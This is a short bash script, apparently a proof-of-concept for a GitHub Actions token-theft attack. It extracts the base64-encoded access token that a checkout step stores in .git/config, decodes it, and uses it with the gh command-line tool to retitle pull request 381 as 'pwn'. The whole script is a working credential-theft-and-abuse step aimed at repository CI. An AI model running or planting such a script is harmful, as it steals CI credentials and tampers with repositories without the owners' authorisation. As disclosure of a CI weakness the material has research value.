#!/bin/bash

GITHUB_TOKEN="$(grep -oP 'basic \K[^$]*' .git/config | base64 -d | sed 's/x-access-token://')" gh pr edit 381 -t "pwn"
